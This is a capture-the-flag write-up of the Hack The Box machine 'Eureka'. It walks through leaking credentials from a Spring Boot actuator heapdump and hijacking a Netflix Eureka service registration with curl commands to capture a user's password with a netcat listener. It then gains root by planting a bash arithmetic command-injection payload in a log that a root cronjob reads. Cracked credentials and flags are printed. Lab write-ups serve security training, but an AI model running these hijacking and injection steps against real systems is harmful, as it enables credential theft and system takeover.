
# PORT SCAN
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | SSH     |
| 80   | HTTP    |
| 8761 | HTTP    |



# RECONNAISSANCE
---

We need to add `furni.htb` to `/etc/hosts`:

```bash
echo '10.10.11.66 furni.htb' | sudo tee -a /etc/hosts
```


![](Pasted image 20250619141244.png)

![](Pasted image 20250619154412.png)


Port `8761` requires authentication, let's fuzz port 80 to check all functionalities on the web application:


```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://furni.htb/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://furni.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .php .html .txt .git .js
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

contact                 [Status: 200, Size: 10738, Words: 578, Lines: 304, Duration: 596ms]
about                   [Status: 200, Size: 14351, Words: 772, Lines: 450, Duration: 1248ms]
login                   [Status: 200, Size: 1550, Words: 195, Lines: 28, Duration: 827ms]
blog                    [Status: 200, Size: 13568, Words: 690, Lines: 399, Duration: 1758ms]
register                [Status: 200, Size: 9028, Words: 1358, Lines: 255, Duration: 1544ms]
services                [Status: 200, Size: 14173, Words: 774, Lines: 433, Duration: 880ms]
shop                    [Status: 200, Size: 12412, Words: 608, Lines: 353, Duration: 3297ms]
comment                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1576ms]
cart                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2175ms]
logout                  [Status: 200, Size: 1159, Words: 117, Lines: 21, Duration: 647ms]
```

We can register and we got some functionalities that only work when logged in, let's create a test account:


```
test1@test.com:test1231234567
```


![](Pasted image 20250619141634.png)

Now we are redirected at a login page, enter your test credentials:

![](Pasted image 20250619141809.png)

Once we login we get back to the main page, since we already authenticated, we can check the other functionalities, let's do it:

![](Pasted image 20250619141903.png)

We can try for some vulnerability such as LFI or SQLI, even XSS, before we do that, let's check the `/comment` directory:

![](Pasted image 20250619141951.png)

Really weird, this is a `404` page but the error message is not the usual one, if we investigate online for the error message, we can find this:

![](Pasted image 20250619142034.png)

Seems like we are dealing with a `Spring Boot` web application, **Spring Boot** is an open-source Java framework designed to simplify the development of stand-alone, production-ready applications. It builds on the Spring Framework by offering a faster and more efficient way to set up and run applications with minimal configuration. 

Since we know we are dealing with Spring Boot, a good approach would be checking potential interesting endpoints and even vulnerabilities for this framework.

Let's fuzz again but with a dedicated wordlist for this, we can find one on `seclists`:

```bash
locate Java-Spring | grep seclists
/usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt
```

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt:FUZZ -u "http://furni.htb/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://furni.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt
 :: Extensions       : .php .html .txt .git .js
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

actuator/heapdump       [Status: 200, Size: 80165337, Words: 0, Lines: 0, Duration: 0ms]
actuator/info           [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 632ms]
actuator/refresh        [Status: 405, Size: 114, Words: 3, Lines: 1, Duration: 439ms]
actuator/env/home       [Status: 200, Size: 668, Words: 11, Lines: 1, Duration: 839ms]
actuator                [Status: 200, Size: 2129, Words: 1, Lines: 1, Duration: 962ms]
actuator/caches         [Status: 200, Size: 20, Words: 1, Lines: 1, Duration: 938ms]
actuator/env            [Status: 200, Size: 6307, Words: 94, Lines: 1, Duration: 826ms]
actuator/env/lang       [Status: 200, Size: 668, Words: 11, Lines: 1, Duration: 821ms]
actuator/metrics        [Status: 200, Size: 3356, Words: 1, Lines: 1, Duration: 631ms]
actuator/env/path       [Status: 200, Size: 668, Words: 11, Lines: 1, Duration: 798ms]
actuator/features       [Status: 200, Size: 467, Words: 6, Lines: 1, Duration: 1004ms]
actuator/health         [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 1309ms]
actuator/scheduledtasks [Status: 200, Size: 54, Words: 1, Lines: 1, Duration: 1007ms]
actuator/mappings       [Status: 200, Size: 35560, Words: 362, Lines: 1, Duration: 1252ms]
actuator/configprops    [Status: 200, Size: 37195, Words: 43, Lines: 1, Duration: 1897ms]
actuator/loggers        [Status: 200, Size: 101592, Words: 1, Lines: 1, Duration: 1186ms]
actuator/conditions     [Status: 200, Size: 184221, Words: 5691, Lines: 1, Duration: 1332ms]
actuator/beans          [Status: 200, Size: 202253, Words: 913, Lines: 1, Duration: 1343ms]
actuator/threaddump     [Status: 200, Size: 1087199, Words: 5, Lines: 1, Duration: 964ms]
```


We got a bunch of stuff on here, if we check information on `/actuator/heapdump`, we can find this:

![](Pasted image 20250619143745.png)


![](Pasted image 20250619143822.png)


This article is pretty useful on how to exploit this misconfiguration:

Article: https://www.wiz.io/blog/spring-boot-actuator-misconfigurations#how-can-wiz-help-88

Let's begin exploitation.


# EXPLOITATION
---

Let's get our heapdump first:

```bash
curl http://furni.htb/actuator/heapdump -O heapdump

% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 76.4M  100 76.4M    0     0  1676k      0  0:00:46  0:00:46 --:--:-- 1636k
```


Once we have this file, we can analyze it, since this is a binary file, we need to use strings, a good approach is to save the output from strings in a file for a better enumeration of it:

```
strings heapdump > heapdump_strings.txt
```

Now, here's a nice approach, the file is to big so we would need to grep or do some manual enumeration which ends up being a hassle, due to it, we can find a tool that can do the work for us, in this case, we can use the following tool:


PYHPROF: https://github.com/wdahlenburg/pyhprof

Download the tool and use it to find relevant info:

```python
python3 spring_heapdumper.py -f ../heapdump > heapdump_findings.txt
```

If we check the code on a text editor, we can find this at the end of the file:

```http
GET /eureka/apps/delta HTTP/1.1
Accept: application/json, application/*+json
Authorization: Basic RXVyZWthU3J2cjowc2NhclBXRGlzVGhlQjNzdA==
Accept-Encoding: gzip, x-gzip, deflate
Host: localhost:8761
Connection: keep-alive
User-Agent: Apache-HttpClient/5.3.1 (Java/17.0.11)



HTTP/1.1 200 

HTTP/1.1 200 
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Length: 0
Date: Thu, 01 Aug 2024 18:29:30 GMT
Keep-Alive: timeout=60
Connection: keep-alive



PUT /eureka/apps/FURNI/eureka:Furni:8082?status=UP&lastDirtyTimestamp=1722535252684 HTTP/1.1
Accept: application/json, application/*+json
Authorization: Basic RXVyZWthU3J2cjowc2NhclBXRGlzVGhlQjNzdA==
Accept-Encoding: gzip, x-gzip, deflate
Content-Length: 0
Host: localhost:8761
Connection: keep-alive
User-Agent: Apache-HttpClient/5.3.1 (Java/17.0.11)
```

There's a bunch of requests made to a `/eureka` endpoint, if we decode the cookie, we get this:


```bash
_________                        __
\_   ___ \_______ ___.__._______/  |_ ___.__.___  ___
/    \  \/\_  __ <   |  |\____ \   __<   |  |\  \/  /
\     \____|  | \/\___  ||  |_> >  |  \___  | >    <
 \______  /|__|   / ____||   __/|__|  / ____|/__/\_ \
        \/        \/     |__|         \/           \/

╔════════════════════════════════════════════════╗
║   >>> CRYPTYX v1.0 <<<                     ║
╠════════════════════════════════════════════════╣
║ 1) Decode Data                            ║
║ 2) Encrypt Data                           ║
║ 3) Generate Fingerprints                 ║
║ 4) Pattern Analysis                      ║
║ 5) Bruteforce Data                       ║
║ 6) Exit                                  ║
╚════════════════════════════════════════════════╝
Cryptyx > 1

[+] Encoded data: RXVyZWthU3J2cjowc2NhclBXRGlzVGhlQjNzdA==

[+] Protocol
 1) Base64
 2) Base32
 3) Hex
 4) URL
[+] Choice (1-4): 1

[+] Decrypted: EurekaSrvr:0scarPWDisTheB3st
```


We find credentials, we can use these credentials on port `8761` since we know they require authentication:

```
EurekaSrvr:0scarPWDisTheB3st
```


![](Pasted image 20250619154515.png)


![](Pasted image 20250619154534.png)

Now we are able to log into the other web application, we already know this got some endpoints under `/eureka`:

![](Pasted image 20250619154627.png)

Something weird on here is the `Ds Replicas` if we search info on this, we find that, DS Replicas (Discovery Server Replicas) shows the other Eureka nodes that mirror the same in‑memory service registry for high availability. In a multi‑node cluster, each replica pushes and pulls registry updates so if one server goes down, the others still know which services are up.

Let's search for anything related to this:


![](Pasted image 20250619155151.png)

![](Pasted image 20250619155203.png)

The `Hacking Netflix Eureka` article seems interesting, let's check it out:

Article: https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka


![](Pasted image 20250619155322.png)
![](Pasted image 20250619155339.png)


![](Pasted image 20250619155536.png)




![](Pasted image 20250619155553.png)

Based on the article, we can perform SSRF, XSS and traffic hijack, we know that the user is interacting with the web application due to the output from the heapdump, if we are able to hijack the traffic, we may be able to retrieve some credentials.

First of all, let's enumerate the `/eureka/apps` endpoint, when we open it, we can see this:

![](Pasted image 20250619160151.png)

This is the full XML:

```json
<applications>
  <versions__delta>1</versions__delta>
  <apps__hashcode>UP_3_</apps__hashcode>

  <application>
    <name>USER-MANAGEMENT-SERVICE</name>
    <instance>
      <instanceId>localhost:USER-MANAGEMENT-SERVICE:8081</instanceId>
      <hostName>localhost</hostName>
      <app>USER-MANAGEMENT-SERVICE</app>
      <ipAddr>10.10.11.66</ipAddr>
      <status>UP</status>
      <overriddenstatus>UNKNOWN</overriddenstatus>
      <port enabled="true">8081</port>
      <securePort enabled="false">443</securePort>
      <countryId>1</countryId>
      <dataCenterInfo class="com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo">
        <name>MyOwn</name>
      </dataCenterInfo>
      <leaseInfo>
        <renewalIntervalInSecs>30</renewalIntervalInSecs>
        <durationInSecs>90</durationInSecs>
        <registrationTimestamp>1750338938747</registrationTimestamp>
        <lastRenewalTimestamp>1750366732760</lastRenewalTimestamp>
        <evictionTimestamp>0</evictionTimestamp>
        <serviceUpTimestamp>1750338938747</serviceUpTimestamp>
      </leaseInfo>
      <metadata>
        <management.port>8081</management.port>
      </metadata>
      <homePageUrl>http://localhost:8081/</homePageUrl>
      <statusPageUrl>http://localhost:8081/actuator/info</statusPageUrl>
      <healthCheckUrl>http://localhost:8081/actuator/health</healthCheckUrl>
      <vipAddress>USER-MANAGEMENT-SERVICE</vipAddress>
      <secureVipAddress>USER-MANAGEMENT-SERVICE</secureVipAddress>
      <isCoordinatingDiscoveryServer>false</isCoordinatingDiscoveryServer>
      <lastUpdatedTimestamp>1750338938747</lastUpdatedTimestamp>
      <lastDirtyTimestamp>1750338937929</lastDirtyTimestamp>
      <actionType>ADDED</actionType>
    </instance>
  </application>

  <application>
    <name>FURNI</name>
    <instance>
      <instanceId>localhost:Furni:8082</instanceId>
      <hostName>localhost</hostName>
      <app>FURNI</app>
      <ipAddr>10.10.11.66</ipAddr>
      <status>UP</status>
      <overriddenstatus>UNKNOWN</overriddenstatus>
      <port enabled="true">8082</port>
      <securePort enabled="false">443</securePort>
      <countryId>1</countryId>
      <dataCenterInfo class="com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo">
        <name>MyOwn</name>
      </dataCenterInfo>
      <leaseInfo>
        <renewalIntervalInSecs>30</renewalIntervalInSecs>
        <durationInSecs>90</durationInSecs>
        <registrationTimestamp>1750338943397</registrationTimestamp>
        <lastRenewalTimestamp>1750366739921</lastRenewalTimestamp>
        <evictionTimestamp>0</evictionTimestamp>
        <serviceUpTimestamp>1750338943397</serviceUpTimestamp>
      </leaseInfo>
      <metadata>
        <management.port>8082</management.port>
      </metadata>
      <homePageUrl>http://localhost:8082/</homePageUrl>
      <statusPageUrl>http://localhost:8082/actuator/info</statusPageUrl>
      <healthCheckUrl>http://localhost:8082/actuator/health</healthCheckUrl>
      <vipAddress>Furni</vipAddress>
      <secureVipAddress>Furni</secureVipAddress>
      <isCoordinatingDiscoveryServer>false</isCoordinatingDiscoveryServer>
      <lastUpdatedTimestamp>1750338943397</lastUpdatedTimestamp>
      <lastDirtyTimestamp>1750338942682</lastDirtyTimestamp>
      <actionType>ADDED</actionType>
    </instance>
  </application>
</applications>
```


We can parse it to `json` for better visualization:

```json
{
  "applications": {
    "versions__delta": 1,
    "apps__hashcode": "UP_3_",
    "application": [
      {
        "name": "USER-MANAGEMENT-SERVICE",
        "instance": {
          "instanceId": "localhost:USER-MANAGEMENT-SERVICE:8081",
          "hostName": "localhost",
          "app": "USER-MANAGEMENT-SERVICE",
          "ipAddr": "10.10.11.66",
          "status": "UP",
          "overriddenstatus": "UNKNOWN",
          "port": { "enabled": true, "value": 8081 },
          "securePort": { "enabled": false, "value": 443 },
          "countryId": 1,
          "dataCenterInfo": { "class": "DefaultDataCenterInfo", "name": "MyOwn" },
          "leaseInfo": {
            "renewalIntervalInSecs": 30,
            "durationInSecs": 90,
            "registrationTimestamp": 1750338938747,
            "lastRenewalTimestamp": 1750366732760,
            "evictionTimestamp": 0,
            "serviceUpTimestamp": 1750338938747
          },
          "metadata": { "management.port": 8081 },
          "homePageUrl": "http://localhost:8081/",
          "statusPageUrl": "http://localhost:8081/actuator/info",
          "healthCheckUrl": "http://localhost:8081/actuator/health",
          "vipAddress": "USER-MANAGEMENT-SERVICE",
          "secureVipAddress": "USER-MANAGEMENT-SERVICE",
          "isCoordinatingDiscoveryServer": false,
          "lastUpdatedTimestamp": 1750338938747,
          "lastDirtyTimestamp": 1750338937929,
          "actionType": "ADDED"
        }
      },
      {
        "name": "FURNI",
        "instance": {
          "instanceId": "localhost:Furni:8082",
          "hostName": "localhost",
          "app": "FURNI",
          "ipAddr": "10.10.11.66",
          "status": "UP",
          "overriddenstatus": "UNKNOWN",
          "port": { "enabled": true, "value": 8082 },
          "securePort": { "enabled": false, "value": 443 },
          "countryId": 1,
          "dataCenterInfo": { "class": "DefaultDataCenterInfo", "name": "MyOwn" },
          "leaseInfo": {
            "renewalIntervalInSecs": 30,
            "durationInSecs": 90,
            "registrationTimestamp": 1750338943397,
            "lastRenewalTimestamp": 1750366739921,
            "evictionTimestamp": 0,
            "serviceUpTimestamp": 1750338943397
          },
          "metadata": { "management.port": 8082 },
          "homePageUrl": "http://localhost:8082/",
          "statusPageUrl": "http://localhost:8082/actuator/info",
          "healthCheckUrl": "http://localhost:8082/actuator/health",
          "vipAddress": "Furni",
          "secureVipAddress": "Furni",
          "isCoordinatingDiscoveryServer": false,
          "lastUpdatedTimestamp": 1750338943397,
          "lastDirtyTimestamp": 1750338942682,
          "actionType": "ADDED"
        }
      }
    ]
  }
}
```


We can find `USER-MANAGEMENT-SERVICE`:

![](Pasted image 20250619160927.png)


We got everything we need to perform the `Hijack`, to understand the flow of the attack, let's follow this diagram I created:

```mermaid
sequenceDiagram
    participant Attacker
    participant EurekaServer as Eureka Server (furni.htb:8761)

    Note over Attacker: Phase 1: Reconnaissance
    Attacker->>EurekaServer: GET /eureka/apps/USER-MANAGEMENT-SERVICE
    EurekaServer-->>Attacker: Existing instance config (XML)
    
    Note over Attacker: Phase 2: Malicious Instance Creation
    Note right of Attacker: Modify config: <br/>1. Change hostName/port<br/>2. Add malicious metadata<br/>3. Save as instance.xml
    Attacker->>EurekaServer: POST /eureka/apps/USER-MANAGEMENT-SERVICE<br/>Content-Type: application/xml<br/>@instance.xml
    EurekaServer-->>Attacker: HTTP 204 (Success)
    
    Note over Attacker: Phase 3: Legitimate Instance Removal
    Attacker->>EurekaServer: DELETE /eureka/apps/USER-MANAGEMENT-SERVICE/localhost:USER-MANAGEMENT-SERVICE:8081
    EurekaServer-->>Attacker: HTTP 200 (Success)
    
    Note over EurekaServer: Service traffic now routed<br/>to attacker's instance
```

We go through these steps:

- **Reconnaissance**:
    
    - Attacker retrieves current service configuration using valid credentials (`EurekaSrvr:0scarPWDisTheB3st`)
    - Server responds with XML configuration of existing `USER-MANAGEMENT-SERVICE` instance
        
- **Instance Hijacking**:
    
    - Attacker modifies the XML:
        - Changes `hostName` to attacker-controlled IP
        - Alters `port` to malicious service port
        - Adds custom metadata for attack purposes
    - Registers malicious instance via POST request with modified XML payload
        
- **Cleanup & Takeover**:

    - Attacker deletes legitimate service instance using its ID (`localhost:USER-MANAGEMENT-SERVICE:8081`)
    - Eureka server now routes all traffic for `USER-MANAGEMENT-SERVICE` to attacker's instance.


It would basically achieve this:

```mermaid
graph LR
    A[Client Requests] --> B[Eureka Server]
    B --> C[Attacker's Instance]
    C --> D[Malicious Actions:<br/> Credential Theft]
```


After understanding the flow of the attack, we can perform the following curl commands:

```bash
curl -u EurekaSrvr:0scarPWDisTheB3st http://furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE > instance.xml
```

After getting the configuration, we need to modify both the `hostname` and the `ipAddr` to our vpn IP:

![](Pasted image 20250619162353.png)

Now, we can register our instance:

```bash
curl -u EurekaSrvr:0scarPWDisTheB3st \
     -H "Content-Type: application/xml" \
     -d @instance.xml \
     -X POST http://furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE
```

After that, we need to delete the other instance:

```bash
curl -su EurekaSrvr:0scarPWDisTheB3st \
     -X DELETE \
     "http://furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE/localhost:USER-MANAGEMENT-SERVICE:8081"
```

But if that's too much of a hassle, we can simply use this command:

```bash
curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE -H 'Content-Type: application/json' -d '{
  "instance": {
    "instanceId": "USER-MANAGEMENT-SERVICE",
    "hostName": "10.10.14.234",  
    "app": "USER-MANAGEMENT-SERVICE",
    "ipAddr": "10.10.14.234",
    "vipAddress": "USER-MANAGEMENT-SERVICE",
    "secureVipAddress": "USER-MANAGEMENT-SERVICE",
    "status": "UP",
    "port": { "$": 8081, "@enabled": "true" },
    "dataCenterInfo": {
      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
      "name": "MyOwn"
    }
  }
}'
```

Before sending it, set up a listener on port `8081` and you will receive this:

![](Pasted image 20250619162916.png)
```http
nc -lvnp 8081
Listening on 0.0.0.0 8081
Connection received on 10.10.11.66 45648
POST /login HTTP/1.1
X-Real-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1,127.0.0.1
X-Forwarded-Proto: http,http
Content-Length: 168
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: SESSION=YWMxYmMwNjctNGQxMi00ZWQ3LThiNTQtODE0NjNkZTFiMjk0
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Forwarded: proto=http;host=furni.htb;for="127.0.0.1:58430"
X-Forwarded-Port: 80
X-Forwarded-Host: furni.htb
host: 10.10.14.234:8081

username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=7PN44TGznjhgdwtU-WEzGcPVCMm-mUAgWinW6TDhuWq7e2oB25ce1wKG_QlNQz0wwUwHIKGzJfHa-HYNPx2wiFPZgQuCGAg4
```

There we go, we got credentials:

```
miranda.wise:IL!veT0Be&BeT0L0ve
```

Let's go into ssh:

![](Pasted image 20250619163212.png)

`miranda.wise` does not work, `miranda-wise` works though:



![](Pasted image 20250619163302.png)

So, correct credentials are:

```
miranda-wise:IL!veT0Be&BeT0L0ve
```

Let's begin privilege escalation.



# PRIVILEGE ESCALATION
---

As always, let's use linpeas first:

![](Pasted image 20250619163803.png)

![](Pasted image 20250619163906.png)

![](Pasted image 20250619163916.png)

As seen, there's a `log_analyse.sh` file on `opt`, which is pretty weird, let's use `pspy` to check if there's any cronjob related to this file:

![](Pasted image 20250619164320.png)

As expected, this actually runs as a cronjob in which the file executes in two different logs, let's check the contents of it and if we can modify it:

```
miranda-wise@eureka:/opt$ ls -la
total 24
drwxr-xr-x  4 root root     4096 Mar 20 14:17 .
drwxr-xr-x 19 root root     4096 Apr 22 12:47 ..
drwxrwx---  2 root www-data 4096 Aug  7  2024 heapdump
-rwxrwxr-x  1 root root     4980 Mar 20 14:17 log_analyse.sh
drwxr-x---  2 root root     4096 Apr  9 18:34 scripts
```

```bash
miranda-wise@eureka:/tmp$ cat /opt/log_analyse.sh
#!/bin/bash

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'

LOG_FILE="$1"
OUTPUT_FILE="log_analysis.txt"

declare -A successful_users  # Associative array: username -> count
declare -A failed_users      # Associative array: username -> count
STATUS_CODES=("200:0" "201:0" "302:0" "400:0" "401:0" "403:0" "404:0" "500:0") # Indexed array: "code:count" pairs

if [ ! -f "$LOG_FILE" ]; then
    echo -e "${RED}Error: Log file $LOG_FILE not found.${RESET}"
    exit 1
fi


analyze_logins() {
    # Process successful logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${successful_users[$username]+_}" ]; then
            successful_users[$username]=$((successful_users[$username] + 1))
        else
            successful_users[$username]=1
        fi
    done < <(grep "LoginSuccessLogger" "$LOG_FILE")

    # Process failed logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${failed_users[$username]+_}" ]; then
            failed_users[$username]=$((failed_users[$username] + 1))
        else
            failed_users[$username]=1
        fi
    done < <(grep "LoginFailureLogger" "$LOG_FILE")
}


analyze_http_statuses() {
    # Process HTTP status codes
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')
        found=0
        # Check if code exists in STATUS_CODES array
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")
}


analyze_log_errors(){
     # Log Level Counts (colored)
    echo -e "\n${YELLOW}[+] Log Level Counts:${RESET}"
    log_levels=$(grep -oP '(?<=Z  )\w+' "$LOG_FILE" | sort | uniq -c)
    echo "$log_levels" | awk -v blue="$BLUE" -v yellow="$YELLOW" -v red="$RED" -v reset="$RESET" '{
        if ($2 == "INFO") color=blue;
        else if ($2 == "WARN") color=yellow;
        else if ($2 == "ERROR") color=red;
        else color=reset;
        printf "%s%6s %s%s\n", color, $1, $2, reset
    }'

    # ERROR Messages
    error_messages=$(grep ' ERROR ' "$LOG_FILE" | awk -F' ERROR ' '{print $2}')
    echo -e "\n${RED}[+] ERROR Messages:${RESET}"
    echo "$error_messages" | awk -v red="$RED" -v reset="$RESET" '{print red $0 reset}'

    # Eureka Errors
    eureka_errors=$(grep 'Connect to http://localhost:8761.*failed: Connection refused' "$LOG_FILE")
    eureka_count=$(echo "$eureka_errors" | wc -l)
    echo -e "\n${YELLOW}[+] Eureka Connection Failures:${RESET}"
    echo -e "${YELLOW}Count: $eureka_count${RESET}"
    echo "$eureka_errors" | tail -n 2 | awk -v yellow="$YELLOW" -v reset="$RESET" '{print yellow $0 reset}'
}


display_results() {
    echo -e "${BLUE}----- Log Analysis Report -----${RESET}"

    # Successful logins
    echo -e "\n${GREEN}[+] Successful Login Counts:${RESET}"
    total_success=0
    for user in "${!successful_users[@]}"; do
        count=${successful_users[$user]}
        printf "${GREEN}%6s %s${RESET}\n" "$count" "$user"
        total_success=$((total_success + count))
    done
    echo -e "${GREEN}\nTotal Successful Logins: $total_success${RESET}"

    # Failed logins
    echo -e "\n${RED}[+] Failed Login Attempts:${RESET}"
    total_failed=0
    for user in "${!failed_users[@]}"; do
        count=${failed_users[$user]}
        printf "${RED}%6s %s${RESET}\n" "$count" "$user"
        total_failed=$((total_failed + count))
    done
    echo -e "${RED}\nTotal Failed Login Attempts: $total_failed${RESET}"

    # HTTP status codes
    echo -e "\n${CYAN}[+] HTTP Status Code Distribution:${RESET}"
    total_requests=0
    # Sort codes numerically
    IFS=$'\n' sorted=($(sort -n -t':' -k1 <<<"${STATUS_CODES[*]}"))
    unset IFS
    for entry in "${sorted[@]}"; do
        code=$(echo "$entry" | cut -d':' -f1)
        count=$(echo "$entry" | cut -d':' -f2)
        total_requests=$((total_requests + count))

        # Color coding
        if [[ $code =~ ^2 ]]; then color="$GREEN"
        elif [[ $code =~ ^3 ]]; then color="$YELLOW"
        elif [[ $code =~ ^4 || $code =~ ^5 ]]; then color="$RED"
        else color="$CYAN"
        fi

        printf "${color}%6s %s${RESET}\n" "$count" "$code"
    done
    echo -e "${CYAN}\nTotal HTTP Requests Tracked: $total_requests${RESET}"
}


# Main execution
analyze_logins
analyze_http_statuses
display_results | tee "$OUTPUT_FILE"
analyze_log_errors | tee -a "$OUTPUT_FILE"
echo -e "\n${GREEN}Analysis completed. Results saved to $OUTPUT_FILE${RESET}"
```

As seen on the script, we can find the following lines:

```bash
if [[ "$existing_code" -eq "$code" ]]; then
    new_count=$((existing_count + 1))
    STATUS_CODES[$i]="${existing_code}:${new_count}"
    break
fi
```

If we search for info related to `-eq` bash privilege escalation, we can find this:

Article: https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/bash-eq-privilege-escalation/


![](Pasted image 20250619165746.png)

![](Pasted image 20250619165925.png)

![](Pasted image 20250619165937.png)

We know the script is being run by a cronjob each minutes and it reads from two log files, even if we can modify the script (which we can), the cronjob wouldn't allow us to get a shell as root by doing the simple trick of:

```
mv script.sh script.sh.bak
echo 'shell' > script.sh
```

Because it doesn't simply run the script.

That's why, we need to exploit the command injection on the file, if we check the permissions of the `developers` group, which we are part of, we can find we can write to:

```bash
miranda-wise@eureka:/tmp$ find / -group developers -perm -g=w 2>/dev/null

/var/www/web/user-management-service
/var/www/web/cloud-gateway
```

Those two are the directories where the log files are available, we can simply delete the current log, any of them two and modify the contents as shown on the article to receive a shell once the cronjob triggers:

```
miranda-wise@eureka:/var/www/web/user-management-service/log$ ls -la
total 52
drwxrwxr-x 3 www-data developers  4096 Jun 19 22:00 .
drwxrwxr-x 6 www-data developers  4096 Mar 19 22:07 ..
-rw-rw-r-- 1 www-data www-data   16974 Jun 19 22:02 application.log
-rw-rw-r-- 1 www-data www-data    6558 Apr 23 07:36 application.log.2025-04-22.0.gz
-rw-rw-r-- 1 www-data www-data    6571 Jun 19 13:13 application.log.2025-04-23.0.gz
drwxrwxr-x 2 www-data www-data    4096 Apr  9 18:20 archive
-rw-rw-r-- 1 www-data www-data     713 Jun 19 22:00 log_analysis.txt
```

Let's delete the `application.log` and replace it with:

```
HTTP Status: a[$(chmod +s /bin/bash)]
```



![](Pasted image 20250619171046.png)


Now, wait until the cronjob is triggered again and we will be able to get a root shell:

![](Pasted image 20250619171149.png)

Nice, let's read both flags:


```
bash-5.0# cat /home/miranda-wise/user.txt
13eebeb1d6d8397b9cd8365a768dabb8

bash-5.0# cat /root/root.txt
ebf28efc01adf54e57bf6ee09d451ba6
```


![](Pasted image 20250619171340.png)


https://www.hackthebox.com/achievement/machine/1872557/658


